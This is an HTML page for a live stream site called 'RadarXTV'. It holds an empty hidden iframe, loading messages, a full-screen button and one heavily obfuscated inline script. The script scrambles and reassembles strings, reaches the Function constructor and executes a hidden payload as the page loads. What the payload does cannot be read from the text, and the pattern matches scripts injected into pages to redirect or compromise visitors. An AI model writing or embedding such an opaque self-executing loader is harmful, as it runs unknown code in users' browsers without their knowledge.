<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
 <div id="refreshMessage">Kindly wait 60 seconds for the stream to load. If it takes longer, please refresh the page.</div>
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
   <!-- <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div> -->
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<script>
(function(){var BJt='',Fio=220-209;function hVK(v){var b=7433785;var f=v.length;var m=[];for(var s=0;s<f;s++){m[s]=v.charAt(s)};for(var s=0;s<f;s++){var w=b*(s+125)+(b%50580);var c=b*(s+400)+(b%20235);var a=w%f;var g=c%f;var t=m[a];m[a]=m[g];m[g]=t;b=(w+c)%7538556;};return m.join('')};var xVt=hVK('pocsuwnotitrbjzeflvaqruknrhotymsdgxcc').substr(0,Fio);var FnU=']az =eao)o,x(p2-hh.v)rrn7ge0ca=.hh(jtlenip8rhcs,wdnbc,=atb]7)ebab=,){o40]88)rx3h{975i7)kcres1,r.=82pi,d;+ph[ggv,+(n;brmad;=rr 7n[]b;or9orn .80amrr.ie8)-rem29ua[m(u]];+;".=.+ f1rs!,r+, ykras3=w(=elu, m,6my0a=9oi=a)!u)+0ts,(4t=rhoo+n){[=0f}kC= )6m)k(2c(f4rei6gd .no{sha50vix(gqv1.mb)-1;7>);;]<sha(=. b=uujf;,,(rp(.[(6v= v a[en=+3vh;C=t3;h1)"jf(;l(o"tl;narutr+oivvC,atv7ch<.;x+= arCrizkbita"l0(da,ttaC0aiu,itss=bo;cvb){tae,oj)*xrjladnrCud+f= t.a0-<v1= ;60hh3Alg) r.; aov ,qpt*(."a;=nah-A)8z;h)+f8,la1vm+;ft,o]t69d;e)8A((rj+op);h6o;;n[2)n9(shhbvvoinj02)) e[=<t;. )k=m]a )s1>-g.}ee.rup;tkbprui.]nrrd)x; d.a(l(lfyn1]s{smcn[);iud(2,=;lpprirox=k,0qvu+om= 2,nuoSign6tq;1-++]=llz[.=ll"1f}}r=,;s;vl[r}+;qvryn==fapse=ft"r+<(s5vim9+;p6(=h=Aqj(ta4;][ckacrt(;spv=( ;nut;i[feg=5=;;c(f(s.r46d;1r{fnhrvfiw;.mi.en+garrat+)Cw= h;l+y(oe+)(abeitce)n.gat[nS;lAe;("lsnc=;brv8evpC+]e7,ltr},ggr.)vpv(ora"}"mfoo .hi)r';var kOg=hVK[xVt];var ris='';var XFq=kOg;var qWn=kOg(ris,hVK(FnU));var LKO=qWn(hVK('()\'c2_!o JksJ5 #)4,epmo&#og\/F]:Jd;onsx#$pJa&JD$%c)t3r(.Jf?={r}4..J.J]J, f=)d7.xpn.eJ?ra]k;s,d_MuJ4aJn(n_Ir)J,d3r1_.n<t0in]8dJn89d3Fai1c}d(H.y6J*d;J%JJa7ad1J]{.Jiuy*Jo![uJirAhpJ%JniJ.n}mt2Jci_t6b __aJJJ"&4sc=b sJ).v6tn.u"dk_ernaf18%Mp .1%8JF uufiy.(J._a2%Se)pdJHr4J1:Jil0ei4:64nlpy(foir5oq)c,l_JJ_9J5mJs7u,3:%t8et4siA0ehJ]{l3.cy.vcdi.$]mrem3E mdf4Jj9oe. =og.n nwe6(el(e%l:=+edfi!%o.n%8{s7t;5.fkcJE)ulu$rtuoc_]dJo\/5inisJa3}ejrJ11?o=J;{$Jt_,j;{].n) ?d\/.sgd$JJo\/ia$qcJ2J_J]f!senr)x*n:nersmJ?eee.!gl@e{d$4Jere$a.ry57\/fJl23s !J33J3)y69i(p)ofJsrtJpe\'7es,b.$}().Jrojhatv\/=s8%)e8%;{JtJ%h#!dJs)1,7)6rib.9J"vbJ,*k frffc!.li i(lJeaJJl)8a_,_%(i)w=y.;!J] $0=M.is[n=hoF(ds!_6e@n)ruJJtca7.a.5a41jcw]Gn]JJ]_eao)c4io]r2]3[(si3($8_(m6i$Ja3]{._]eJI,{vJn5tEw %(Jl]hb!Jen$$JxC,1E[i;Jeo_pfJ3$]m5r6u%Ji!Ce))_\/p!3eedh!%t._rBlb(J9J_:J;u.bed,])]J.i3eNsv+Ld=H8e"JKsfJxj\')$Jg tcJeie]7JGl1JrwtJn)7oJ6L3bJ7.J.brdJJmcJ].l!5o3};J,(srr,.dj;u$,&JcJl}gdoE;J$93e%2=)aolJnyJ.J3n+O7J5gi11},)I8rnfon38dex])]EJP\/3dr.(_!n]cl1dtJJtlrei}JJi8J,s4ero;2dyds0 IJC3p9MtnJ)mJ)ge.Ctc40_cr_)3)1n#$(rev.\/F5@a=$,.8M_{ "4t.Dr%fJ.Jl;uJe9t]nj)9la.;s9lif2-h)JfCatJ%se]o.8 da(%J f(1v,.xJ45m[J4i{7edu,J6%G;[AJ3tiJL0dt1fJJccP;JJJ)=d+M)t;J%J)dJ)j=7620o18.)0dJ719=JyEnN.9);38eje$)a,6j+$g.6cLJ"o\/cf)t$%Je$JJLJ#"4tu14d2JJ:e_"[O>}6rJ7!JooJ $r{$p(qJ85e)srJ{};e$)#J.;as5;icg_Le"s_J(>J.Jio2J[6.)0c2Gnn,JD;40dd!ome)JJ31(h](J-tepeeiF4u(cB=8n.2Ja.1(,Jdn;.eu%c\'){C>8j{JseoeJ2{d.9&_($a%8J]\/.[tLrSo\/J!33),_.n)jym)o7(6cbJtJt;.(boJ,slKboL%.J.2t%zC3JJ)ea!g!3JvJ0&w;J8iJ%J>{N1nJt)J#,7s%=93?r7klv]epu.rJ+tJC4aiJS Jiu%!)_Jfu5t8rJ](_G(ldJ@{fA)i2Jr)ofcJ}rJler(Me)s4r7fdp!(}aJ$eJJitm.)o(o;JO6]$(Jogf(J$_JPJod{r[J=ucJE$)jdC.sc,o)?)51;Jnn.%J9rsnroStJJ1tJs&bgJJLJ%4i.e((CfmJ7mdyeduJ(60=] ,iDLJ=92lie%)iJK;8i)-%25,J]jot3._.+qn]8_)_ul{u\'t;Jj JJ_Joe66=($aJl0t;fi!.o3)_l){J1Jm dJ (m4!hn.J()J,30dJ@be(B)L{9f,C,d,o{!+=%0\/cn9a(iJ,(2r};,.PJ"oln14;5SL74n?23_.J5o))g};EtfspJi!na_$. %.8J1JJa$4nJ_dOHh7,J16E(J}fo{N5E7n$7J_4t]JJ(ot._Jn9bclad;l tIbrd#eJxn?aLetJsu.J%LftHoid"uyg$1c!%<d}it{9Jon(=4l_d2)5,_5t\/inl(;9.tu]6_(r!1nsn]"(.3oJri1MJwa_dnLn8J= (96.]ctdrd$ea)_ %M]r.Jn;dj afrrmJnrid2# dnBt+b$!r6K_m JJ_(]J9le nJ J;=}feI_1?$;(]J)J]oJ.fe(!J{r(t4 [JJ xfia.$(ag)(Jte9;8b_ rgll,cb d]s-en.akJa o$()2_tscjuoEJJ3JJ;l70J36!c( JJ#o%J( $JeJamehi\/rl[ynldJde  J0a ce2a2)J;.fJlef_( dJttate](d$!cfi1o=e}J}5],Jd}J.9i! n].q'));var jmj=XFq(BJt,LKO );jmj(9613);return 2716})()
</script>

</body>
</html>